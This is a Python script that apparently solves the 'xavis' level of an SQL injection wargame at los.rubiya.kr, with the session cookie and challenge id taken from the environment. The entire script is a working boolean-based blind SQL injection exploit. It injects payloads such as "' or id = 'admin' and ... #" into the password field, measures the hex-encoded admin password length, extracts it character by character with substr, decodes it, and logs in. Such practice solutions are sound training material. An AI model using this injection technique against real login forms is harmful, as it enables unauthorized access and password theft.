import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/xavis_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}


pw_length = 0

for  i in range(1, 100):

    res = requests.get(url, params={'pw': f'\' or id = \'admin\' and {i} <= length(hex(pw)) #'},cookies=cookie)

    if res.text.find("Hello admin") > 0:
        pw_length = i + 1
    else:
        break

print(f"hexed pw length: {pw_length}")

ans = ""
for i in range(0, pw_length):
    for c in "0123456789ABCDEF":
        res = requests.get(url, params={'pw': f'\' or id = \'admin\' and \'{c}\' = substr(hex(pw),{i+1},1) #'}, cookies=cookie)
        if res.text.find("Hello admin") > 0:
            ans += c
            break
    print(f"(in progress)ans: {ans}")
    
print(f"pw (hexed): {ans}")
ans = bytes.fromhex(ans).decode('utf-32-be')
print(f"pw: {ans}")

res = requests.get(url, params={'pw': ans},cookies=cookie)

if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")